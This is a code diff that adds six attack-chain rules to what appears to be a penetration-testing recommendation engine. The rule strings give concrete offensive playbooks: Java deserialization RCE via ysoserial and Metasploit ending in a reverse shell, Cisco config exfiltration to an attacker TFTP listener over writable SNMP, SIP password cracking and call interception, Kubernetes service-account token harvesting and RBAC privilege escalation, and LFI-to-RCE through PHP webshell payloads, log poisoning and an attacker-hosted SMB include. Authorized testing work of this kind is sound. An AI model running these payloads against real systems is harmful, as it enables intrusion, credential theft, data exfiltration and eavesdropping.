@@ -695,6 +695,187 @@ _CHAIN_RULES: tuple[dict, ...] = (
             "tries them."
         ),
     },
+    {
+        "name": "chain_dns_forest_map",
+        "severity": "high",
+        "triggers": frozenset({
+            "dns_axfr", "dns_ad_srv", "ldap_anon_bind", "ldap_rootdse",
+            "dns_nsec_walk",
+        }),
+        "suggestion": (
+            "Merge AXFR + SRV + LDAP rootDSE outputs into one forest map: "
+            "dig @<dns> <domain> AXFR > axfr.txt; dig @<dns> "
+            "_ldap._tcp.dc._msdcs.<domain> SRV; dig @<dns> "
+            "_kerberos._tcp.<domain> SRV; ldapsearch -x -H ldap://<dc> -s "
+            "base namingContexts defaultNamingContext "
+            "configurationNamingContext schemaNamingContext "
+            "rootDomainNamingContext > rootdse.txt. Cross-reference into a "
+            "single forest.md with sites, subnets, GC servers, and trust "
+            "relationships (ldapsearch -x -b 'CN=System,<basedn>' "
+            "'(objectClass=trustedDomain)'). Feeds every downstream AD rule "
+            "with an accurate namingContext + DC list."
+        ),
+        "rationale": (
+            "AXFR alone gives records; LDAP rootDSE alone gives "
+            "namingContexts — the merged forest map is what BloodHound + "
+            "subsequent AD rules assume exists."
+        ),
+    },
+    {
+        "name": "chain_java_rmi_jmx_deser",
+        "severity": "critical",
+        "triggers": frozenset({
+            "jmx_rmi_open", "rmi_registry_open", "java_serialization_endpoint",
+            "jenkins_jnlp", "jnlp_reachable", "jnlp_cli2_deser_rce",
+            "weblogic_t3_open", "websphere_iiop_open",
+        }),
+        "suggestion": (
+            "For plain RMI/JMX: nmap --script rmi-dumpregistry -p <port> "
+            "<host> to list bound objects, then ysoserial "
+            "CommonsCollections6 'curl <listener>' | msfconsole -q -x 'use "
+            "exploit/multi/misc/java_rmi_server; set RHOSTS <host>; set "
+            "RPORT <port>; run' (or python3 jmxploit.py -t <host> -p <port> "
+            "-c 'id'). For JNLP/Jenkins CLI: java -jar exploit.jar <host> "
+            "<port> 'id' (CVE-2017-1000353 or the newer CVE-2024-43044 "
+            "depending on version). For WebLogic T3: python3 "
+            "CVE-2020-2555.py <host> <port>. For WebSphere IIOP: ysoserial "
+            "with CORBA payload. In every case: verify with `curl` from a "
+            "distinctive path first, then swap payload to reverse shell."
+        ),
+        "rationale": (
+            "Java-serialization RCEs are the fastest unauth-to-shell path "
+            "on many enterprise stacks; the trigger set covers the four "
+            "common exposure surfaces so the tester sees one rule "
+            "regardless of which family they hit."
+        ),
+    },
+    {
+        "name": "chain_snmp_write_reconfig",
+        "severity": "critical",
+        "triggers": frozenset({
+            "snmp_write_community", "snmp_default_community",
+            "snmp_v1v2_community", "snmp_cmdline_creds", "snmp_routes",
+        }),
+        "suggestion": (
+            "If write community found: snmpset -v2c -c <rw> <host> "
+            "sysContact.0 s 'test' && snmpget -v2c -c <rw> <host> "
+            "sysContact.0 (read-back proves write). Enumerate reconfig "
+            "surface: snmpwalk -v2c -c <rw> <host> 1.3.6.1.2.1.4.21 "
+            "(routing table), 1.3.6.1.2.1.14 (OSPF), 1.3.6.1.4.1.9.9.87 "
+            "(Cisco config-copy MIB — can pull running-config to a TFTP "
+            "listener you control: snmpset write to ccCopyEntry). For "
+            "Cisco: snmp-config-copy.py -t <host> -c <rw> -s tftp -a "
+            "<listener> -f running-config. For Juniper/Aruba/HP: analogous "
+            "vendor-config MIB. If snmp_cmdline_creds fired, prioritize "
+            "hosts running credful services for the reconfig target "
+            "(attacker-defined route or ACL to reach isolated segments). "
+            "READ-ONLY proof first (sysDescr write-back), then written "
+            "client authorization before any routing/config change."
+        ),
+        "rationale": (
+            "Write community + Cisco config-copy MIB is a full-config-"
+            "exfil primitive that most testers know exists but few actually "
+            "chain — this rule pastes the exact TFTP-pull sequence."
+        ),
+    },
+    {
+        "name": "chain_sip_rtp_eavesdrop",
+        "severity": "high",
+        "triggers": frozenset({
+            "sip_options_open", "sip_register_realm_leak",
+            "sip_default_creds", "sip_user_enum", "rtp_streams_visible",
+            "sip_no_tls",
+        }),
+        "suggestion": (
+            "Passive first: sngrep -I <iface> or wireshark filter 'sip' "
+            "for the SIP signalling, and 'rtp' for the media. For active "
+            "enum: svmap.py <host>; svwar.py -e100-200 -m INVITE <host> "
+            "(finds live extensions); svcrack.py -u <ext> -d passwords.txt "
+            "<host> (if sip_register_realm_leak fired, use the captured "
+            "realm to filter Auth). Once one valid extension: baresip -f "
+            "config -a account (REGISTER as that ext, receive calls). "
+            "Capture live calls: rtpbreak -i <iface> -r target.pcap; then "
+            "convert with sox rtp.raw call.wav or use rtpinsertsound / "
+            "rtpmixsound for active-injection tests (get written "
+            "authorization first — voice manipulation is a felony in many "
+            "jurisdictions)."
+        ),
+        "rationale": (
+            "SIP+RTP chains rarely make it into pentest reports because "
+            "the tester doesn't know to bring sngrep + rtpbreak + baresip "
+            "together; this rule lists the exact toolchain."
+        ),
+    },
+    {
+        "name": "chain_k8s_token_to_rbac_privesc",
+        "severity": "critical",
+        "triggers": frozenset({
+            "kubelet_anon", "kubelet_exec", "k8s_escape_pods",
+            "k8s_webhook_disclosure", "imds_iam_credentials_exposed",
+            "docker_env_secrets", "docker_secrets",
+        }),
+        "suggestion": (
+            "Harvest tokens from every accessible pod: for each pod on "
+            "kubelet_anon nodes, curl -sk "
+            "https://<node>:10250/exec/<ns>/<pod>/<container>?command=cat"
+            "&args=/var/run/secrets/kubernetes.io/serviceaccount/token (or "
+            "exec cat directly). For every token: TOKEN=<jwt>; kubectl "
+            "--token=$TOKEN --server=https://<api>:6443 auth can-i --list "
+            "-A > perms_$sa.txt and grep for '*.*' (cluster-admin), 'get "
+            "secrets', 'create pods', 'patch rolebindings', 'escalate "
+            "roles', 'bind roles'. Escalation paths: (a) 'create pods' + "
+            "hostPath mount = node-root; (b) 'patch/update rolebindings' = "
+            "cluster-admin write; (c) 'create tokenrequests' on privileged "
+            "SA = impersonation; (d) if k8s_webhook_disclosure showed "
+            "failurePolicy=Ignore, kubectl apply -f evil.yaml can bypass a "
+            "webhook that's supposed to block it. Cross-reference "
+            "imds_iam_credentials_exposed for the AWS IRSA path — kubectl "
+            "exec on a pod with an IRSA-annotated SA yields its AWS temp "
+            "creds via env inspection."
+        ),
+        "rationale": (
+            "Kubelet-anon alone yields token dumps; token dumps alone "
+            "yield permission lists; only the chain yields the actual "
+            "privesc path — and the failurePolicy=Ignore bypass from "
+            "k8s_webhook_disclosure is easy to miss without this "
+            "correlation."
+        ),
+    },
+    {
+        "name": "chain_http_lfi_to_rce",
+        "severity": "critical",
+        "triggers": frozenset({
+            "http_lfi", "http_rfi", "http_path_traversal",
+            "http_upload_endpoint", "http_ssrf", "http_deserialization",
+            "webdav_put_rce",
+        }),
+        "suggestion": (
+            "Confirm LFI depth: curl "
+            "'http://<host>/vuln?f=../../../../../../../etc/passwd' or "
+            "wrap in php://filter (curl 'http://<host>/vuln?f=php://filter"
+            "/convert.base64-encode/resource=index.php') to read source. "
+            "LFI-to-RCE bridges: (a) if PHP session files readable, poison "
+            "via User-Agent then include /tmp/sess_<id>; (b) "
+            "/proc/self/environ include with HTTP_USER_AGENT: '<?php "
+            "system($_GET[c]); ?>'; (c) log-poisoning: send crafted URI "
+            "containing PHP, then include /var/log/apache2/access.log; (d) "
+            "SMB share include on Windows: curl "
+            "'http://<host>/vuln?f=\\\\\\\\<attacker>\\\\share\\\\shell.php' "
+            "(needs SMB signing disabled — cross-check "
+            "smb_signing_not_required). If http_upload_endpoint fired, "
+            "jump straight to upload + LFI-include the uploaded file. "
+            "WebDAV PUT RCE = curl -T shell.aspx -u <user>:<pw> "
+            "http://<host>/webdav/, then browse to /webdav/shell.aspx. "
+            "Deserialization (Java/PHP/.NET) -> ysoserial/phpggc/"
+            "ysoserial.net respectively."
+        ),
+        "rationale": (
+            "LFI-alone is medium; LFI + a wrapper + a log or session-"
+            "poison path is unauth RCE — the chain names all four bridges "
+            "plus the WebDAV shortcut so the tester doesn't stop at "
+            "\"file read\"."
+        ),
+    },
 )
 
 
@@ -755,6 +936,12 @@ _rule_coerce_and_relay = _make_chain_rule(_CHAIN_RULES[8])
 _rule_printer_to_domain_creds = _make_chain_rule(_CHAIN_RULES[9])
 _rule_ot_ics_process_impact = _make_chain_rule(_CHAIN_RULES[10])
 _rule_esxi_vcenter_takeover = _make_chain_rule(_CHAIN_RULES[11])
+_rule_dns_forest_map = _make_chain_rule(_CHAIN_RULES[12])
+_rule_java_rmi_jmx_deser = _make_chain_rule(_CHAIN_RULES[13])
+_rule_snmp_write_reconfig = _make_chain_rule(_CHAIN_RULES[14])
+_rule_sip_rtp_eavesdrop = _make_chain_rule(_CHAIN_RULES[15])
+_rule_k8s_token_to_rbac_privesc = _make_chain_rule(_CHAIN_RULES[16])
+_rule_http_lfi_to_rce = _make_chain_rule(_CHAIN_RULES[17])
 
 
 _SUGGESTION_RULES = (
@@ -781,6 +968,12 @@ _SUGGESTION_RULES = (
     _rule_printer_to_domain_creds,
     _rule_ot_ics_process_impact,
     _rule_esxi_vcenter_takeover,
+    _rule_dns_forest_map,
+    _rule_java_rmi_jmx_deser,
+    _rule_snmp_write_reconfig,
+    _rule_sip_rtp_eavesdrop,
+    _rule_k8s_token_to_rbac_privesc,
+    _rule_http_lfi_to_rce,
 )
 
 
